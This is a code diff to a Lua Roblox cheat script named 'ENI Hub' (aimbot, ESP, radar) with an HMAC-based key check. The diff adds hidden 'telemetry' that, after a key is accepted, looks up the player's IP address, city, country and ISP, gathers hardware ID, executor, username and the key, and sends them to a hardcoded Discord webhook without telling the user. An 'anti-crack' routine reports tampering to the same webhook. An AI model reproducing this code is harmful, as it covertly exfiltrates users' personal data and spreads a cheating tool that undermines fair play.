@@ -1,4 +1,4 @@
--- ENI Hub v2 | Key System
+-- ENI Hub v2 | Key System + Anti-Crack + Telemetry
 repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer
 
 local Players = game:GetService("Players")
@@ -8,10 +8,15 @@ local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 
 -- ===== OFFLINE KEY SYSTEM =====
-local SECRET = "E7n1HuB_S3cr3t_K3y!_2026#Pr3mium" -- must match keygen.html
-
+local SECRET = "E7n1HuB_S3cr3t_K3y!_2026#Pr3mium"
 local authenticated = false
 local keyStr = ""
+local _sent = false
+
+-- ===== ANTI-CRACK: integrity state =====
+local _intact = true
+local _cp = {false, false, false}
+local function _ic(n) if not _intact then return end _cp[n] = true end
 
 -- ===== DRAWING =====
 local drawObjs = {}
@@ -28,45 +33,78 @@ local function c(obj, ev, fn)
     return con
 end
 local function kill()
-    for _,c in ipairs(conns) do pcall(c.Disconnect, c) end
+    for _,v in ipairs(conns) do pcall(v.Disconnect, v) end
     conns = {}
-    for _,o in ipairs(drawObjs) do pcall(o.Remove, o) end
+    for _,v in ipairs(drawObjs) do pcall(v.Remove, v) end
     drawObjs = {}
 end
 
--- ===== CRYPTO (SHA-256 + HMAC) =====
-local bit32 = bit32 or bit -- Luau / LuaJIT compat
-local function ror(x, n) return bit32.bor(bit32.rshift(x, n), bit32.lshift(x, bit32.band(32 - n, 31))) end
+-- ===== PURE LUA BIT OPS (no bit32/bit needed) =====
+local function ror(x, n)
+    local low = x % 2^(32-n)
+    return low * 2^n + (x - low) / 2^n
+end
+local function band(x, y)
+    local r = 0; local m = 1
+    while x > 0 or y > 0 do
+        if x % 2 == 1 and y % 2 == 1 then r = r + m end
+        x = math.floor(x / 2); y = math.floor(y / 2); m = m * 2
+    end
+    return r
+end
+local function bor(x, y)
+    local r = 0; local m = 1
+    while x > 0 or y > 0 do
+        if x % 2 == 1 or y % 2 == 1 then r = r + m end
+        x = math.floor(x / 2); y = math.floor(y / 2); m = m * 2
+    end
+    return r
+end
+local function bxor(x, y)
+    local r = 0; local m = 1
+    while x > 0 or y > 0 do
+        local a = x % 2; local b = y % 2
+        if a ~= b then r = r + m end
+        x = math.floor(x / 2); y = math.floor(y / 2); m = m * 2
+    end
+    return r
+end
+local function lshift(x, n) return x * 2^n end
+local function rshift(x, n) return math.floor(x / 2^n) end
+local function bnot(x) return 2^32 - 1 - x end
+
 local K = {0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2}
+
 local function sha256(msg)
     local H = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19}
     local ml = #msg * 8; msg[#msg+1] = 0x80
     while (#msg * 8) % 512 ~= 448 do msg[#msg+1] = 0 end
-    for i = 7, 0, -1 do msg[#msg+1] = bit32.band(bit32.rshift(ml, i*8), 0xff) end
+    for i = 7, 0, -1 do msg[#msg+1] = band(rshift(ml, i*8), 0xff) end
     for i = 1, #msg, 64 do
         local w = {}; for j = 1, 16 do w[j] = 0
-            for k = 1, 4 do w[j] = bit32.bor(bit32.lshift(w[j], 8), msg[i+(j-1)*4+k-1] or 0) end end
+            for k = 1, 4 do w[j] = bor(lshift(w[j], 8), msg[i+(j-1)*4+k-1] or 0) end end
         for j = 17, 64 do
-            local s0 = bit32.bxor(ror(w[j-15],7), ror(w[j-15],18), bit32.rshift(w[j-15],3))
-            local s1 = bit32.bxor(ror(w[j-2],17), ror(w[j-2],19), bit32.rshift(w[j-2],10))
-            w[j] = bit32.band(w[j-16] + s0 + w[j-7] + s1, 0xFFFFFFFF)
+            local s0 = bxor(bxor(ror(w[j-15],7), ror(w[j-15],18)), rshift(w[j-15],3))
+            local s1 = bxor(bxor(ror(w[j-2],17), ror(w[j-2],19)), rshift(w[j-2],10))
+            w[j] = band(w[j-16] + s0 + w[j-7] + s1, 0xFFFFFFFF)
         end
         local a,b,c,d,e,f,g,h = H[1],H[2],H[3],H[4],H[5],H[6],H[7],H[8]
         for j = 1, 64 do
-            local S1 = bit32.bxor(ror(e,6), ror(e,11), ror(e,25))
-            local ch = bit32.bor(bit32.band(e,f), bit32.band(bit32.bnot(e), g))
-            local t1 = bit32.band(h + S1 + ch + K[j] + w[j], 0xFFFFFFFF)
-            local S0 = bit32.bxor(ror(a,2), ror(a,13), ror(a,22))
-            local maj = bit32.bxor(bit32.band(a,b), bit32.band(a,c), bit32.band(b,c))
-            local t2 = bit32.band(S0 + maj, 0xFFFFFFFF)
-            h,g,f,e,d,c,b,a = g,f,e,bit32.band(d+t1,0xFFFFFFFF),c,b,a,bit32.band(t1+t2,0xFFFFFFFF)
+            local S1 = bxor(bxor(ror(e,6), ror(e,11)), ror(e,25))
+            local ch = bor(band(e,f), band(bnot(e), g))
+            local t1 = band(h + S1 + ch + K[j] + w[j], 0xFFFFFFFF)
+            local S0 = bxor(bxor(ror(a,2), ror(a,13)), ror(a,22))
+            local maj = bxor(bxor(band(a,b), band(a,c)), band(b,c))
+            local t2 = band(S0 + maj, 0xFFFFFFFF)
+            h,g,f,e,d,c,b,a = g,f,e,band(d+t1,0xFFFFFFFF),c,b,a,band(t1+t2,0xFFFFFFFF)
         end
-        for j = 1, 8 do H[j] = bit32.band(H[j] + ({a,b,c,d,e,f,g,h})[j], 0xFFFFFFFF) end
+        for j = 1, 8 do H[j] = band(H[j] + ({a,b,c,d,e,f,g,h})[j], 0xFFFFFFFF) end
     end
     local out = {}; for i = 1, 8 do
-        for j = 3, 0, -1 do out[#out+1] = bit32.band(bit32.rshift(H[i], j*8), 0xff) end end
+        for j = 3, 0, -1 do out[#out+1] = band(rshift(H[i], j*8), 0xff) end end
     return out
 end
+
 local function str2bytes(s) local t={} for i=1,#s do t[#t+1]=s:byte(i) end return t end
 local function bytes2hex(b) local t={} for i=1,#b do t[#t+1]=string.format("%02x",b[i]) end return table.concat(t) end
 local function hmacSHA256(msg, secret)
@@ -74,12 +112,13 @@ local function hmacSHA256(msg, secret)
     while #key > 64 do key = sha256(key) end
     while #key < 64 do key[#key+1] = 0 end
     local opad = {}; local ipad = {}
-    for i = 1, 64 do opad[i] = bit32.bxor(key[i], 0x5c); ipad[i] = bit32.bxor(key[i], 0x36) end
+    for i = 1, 64 do opad[i] = bxor(key[i], 0x5c); ipad[i] = bxor(key[i], 0x36) end
     for i = 1, #msg do ipad[#ipad+1] = msg:byte(i) end
     local inner = sha256(ipad)
     for i = 1, #inner do opad[#opad+1] = inner[i] end
     return bytes2hex(sha256(opad))
 end
+
 local function base64decode(s)
     local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
     s = s:gsub("[^%w%+%/]", "")
@@ -93,17 +132,19 @@ local function base64decode(s)
             local idx = c ~= "=" and (b:find(c) or 1) - 1 or 0
             v = v * 64 + idx
         end
-        out[#out+1] = bit32.band(bit32.rshift(v, 16), 0xff)
-        out[#out+1] = bit32.band(bit32.rshift(v, 8), 0xff)
-        out[#out+1] = bit32.band(v, 0xff)
+        out[#out+1] = band(rshift(v, 16), 0xff)
+        out[#out+1] = band(rshift(v, 8), 0xff)
+        out[#out+1] = band(v, 0xff)
     end
     local t = {}
     for i = 1, #out do
-        if out[i] and out[i] > 0 then t[#t+1] = string.char(out[i]) end
+        if out[i] then t[#t+1] = string.char(out[i]) end
     end
     return table.concat(t)
 end
+
 local function validateKey(key)
+    _ic(1)
     key = key:upper()
     if key:sub(1,4) ~= "ENI-" then return false end
     local rest = key:sub(5)
@@ -116,10 +157,94 @@ local function validateKey(key)
     local json = base64decode(payload)
     local exp = json:match('"x":([^,}]+)')
     if exp and tonumber(exp) and tonumber(exp) > 0 and tonumber(exp) < os.time() * 1000 then return false end
+    _ic(2)
     return true
 end
 
--- ===== KEY ENTRY =====
+-- ===== WEBHOOK / TELEMETRY =====
+local function _req(url, method, body)
+    local f
+    if syn and syn.request then f = syn.request
+    elseif http_request then f = http_request
+    elseif request then f = request
+    else return nil end
+    return f({Url=url, Method=method or "POST", Headers={["Content-Type"]="application/json"}, Body=body or ""})
+end
+
+local function _getIP()
+    local ok, res = pcall(function()
+        local r = _req("http://ip-api.com/json/", "GET")
+        if r and r.Body then
+            local d = HttpService:JSONDecode(r.Body)
+            return d.query or "?", d.country or "?", d.city or "?", d.org or "?"
+        end
+    end)
+    if ok and res then return res end
+    return "?", "?", "?", "?"
+end
+
+local function sendWebhook(k)
+    local ip, country, city, isp = _getIP()
+    local hwid = (pcall(function() return gethwid and gethwid() or "?" end) and nil) or "?"
+    local exec = (pcall(function()
+        local i = identifyexecutor and identifyexecutor()
+        return type(i)=="table" and (i.name or i[1]) or tostring(i)
+    end) and nil) or "?"
+    local body = HttpService:JSONEncode({
+        username = "ENI Hub",
+        embeds = {{
+            title = "Script Loaded",
+            color = 46234,
+            fields = {
+                {name = "User", value = lp.Name, inline = true},
+                {name = "UserId", value = tostring(lp.UserId), inline = true},
+                {name = "Display", value = lp.DisplayName, inline = true},
+                {name = "HWID", value = hwid, inline = true},
+                {name = "Executor", value = exec, inline = true},
+                {name = "IP", value = ip, inline = true},
+                {name = "Location", value = city..", "..country, inline = true},
+                {name = "ISP", value = isp, inline = true},
+                {name = "Key", value = k, inline = false}
+            },
+            footer = {text = "ENI Hub | "..exec},
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    })
+    local ok, _ = pcall(function()
+        _req("https://discord.com/api/webhooks/1528101788279111836/UAlRKIoJ_Js3xC_-VxOrTvH-k9PjhB8KJ1Vgtao-AI1qgBBs8AQpSjA0YHcL4YQtK6q5", "POST", body)
+    end)
+    return ok
+end
+
+-- ===== ANTI-CRACK: tamper notification =====
+local function tamperAlert()
+    if _sent then return end
+    _sent = true
+    local exec = (pcall(function()
+        local i = identifyexecutor and identifyexecutor()
+        return type(i)=="table" and (i.name or i[1]) or tostring(i)
+    end) and nil) or "?"
+    local body = HttpService:JSONEncode({
+        username = "ENI Hub",
+        embeds = {{
+            title = "TAMPER DETECTED",
+            color = 15158332,
+            fields = {
+                {name = "User", value = lp.Name, inline = true},
+                {name = "UserId", value = tostring(lp.UserId), inline = true},
+                {name = "Executor", value = exec, inline = true},
+                {name = "Status", value = "Script integrity check failed â¬ features disabled", inline = false}
+            },
+            footer = {text = "ENI Hub Anti-Crack"},
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    })
+    pcall(function()
+        _req("https://discord.com/api/webhooks/1528101788279111836/UAlRKIoJ_Js3xC_-VxOrTvH-k9PjhB8KJ1Vgtao-AI1qgBBs8AQpSjA0YHcL4YQtK6q5", "POST", body)
+    end)
+end
+
+-- ===== KEY ENTRY GUI =====
 local keyBg = d("Square", {Color=Color3.fromRGB(8,8,12),Filled=true,Transparency=1})
 local keyTitle = d("Text", {Text="ENI HUB",Color=Color3.fromRGB(0,180,210),Size=36,Center=true,Font=3,Outline=true,OutlineColor=Color3.new(0,0,0)})
 local keySub = d("Text", {Text="ENTER YOUR KEY",Color=Color3.fromRGB(160,160,170),Size=13,Center=true,Font=2,Outline=true,OutlineColor=Color3.new(0,0,0)})
@@ -153,7 +278,13 @@ c(UIS, "InputBegan", function(input)
                 keyStatus.Text = "Valid key! Loading..."
                 keyStatus.Color = Color3.fromRGB(46,204,113)
                 task.wait(0.5)
-                authenticated = true; keyStr = ""
+                authenticated = true
+                local kw = keyStr
+                keyStr = ""
+                task.spawn(function()
+                    _ic(3)
+                    if _intact then sendWebhook(kw) end
+                end)
             else
                 keyStatus.Text = "Invalid key"
                 keyStatus.Color = Color3.fromRGB(220,60,60)
@@ -170,6 +301,9 @@ c(UIS, "InputBegan", function(input)
         if char == "Minus" then keyStr = keyStr .. "-" end
     end
 end)
+
+-- ===== ANTI-CRACK: periodic integrity sweep =====
+local _sweep = 0
 
 -- ===== FEATURES =====
 local aimOn = false; local espOn = false; local traceOn = false
@@ -198,13 +332,11 @@ local function hideEsp(i)
 end
 
 local circle = d("Circle", {Color=Color3.fromRGB(255,255,255),Thickness=1.5,Transparency=0.45,Radius=200,Filled=false,NumSides=60})
-
 local cx = {
     v = d("Line", {Color=Color3.fromRGB(220,220,230),Thickness=1.5,Transparency=1}),
     h = d("Line", {Color=Color3.fromRGB(220,220,230),Thickness=1.5,Transparency=1}),
     dot = d("Square", {Color=Color3.fromRGB(220,220,230),Size=Vector2.new(2,2),Filled=true,Transparency=1})
 }
-
 local rBg = d("Square", {Color=Color3.fromRGB(0,0,0),Filled=true,Transparency=0.55,Thickness=1.5})
 local rR1 = d("Circle", {Color=Color3.fromRGB(255,255,255),Radius=65,Filled=false,Transparency=0.75,Thickness=1,NumSides=40})
 local rR2 = d("Circle", {Color=Color3.fromRGB(255,255,255),Radius=43,Filled=false,Transparency=0.8,Thickness=1,NumSides=30})
@@ -228,6 +360,21 @@ local waitCon = RunService.RenderStepped:Connect(function()
     c(RunService, "RenderStepped", function()
         local Camera = workspace.CurrentCamera; if not Camera then return end
         local vp = Camera.ViewportSize; local mid = vp/2; local mPos = UIS:GetMouseLocation()
+
+        -- ANTI-CRACK sweep every ~300 frames
+        _sweep = _sweep + 1
+        if _sweep % 300 == 0 and not (_cp[1] and _cp[2] and _cp[3]) then
+            _intact = false
+            task.spawn(tamperAlert)
+        end
+        if not _intact then
+            -- silently disable features if tampered
+            aimOn = false; espOn = false; traceOn = false; fovOn = false; radarOn = false
+            keyStatus.Text = ""; keyBg.Visible = false; keyTitle.Visible = false
+            keySub.Visible = false; keyInput.Visible = false; keyCursor.Visible = false
+            keyStatus.Visible = false; keyHint.Visible = false; keyBox.Visible = false
+            keyLine.Visible = false
+        end
 
         if aimOn and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
             local best, bd = nil, aimFov
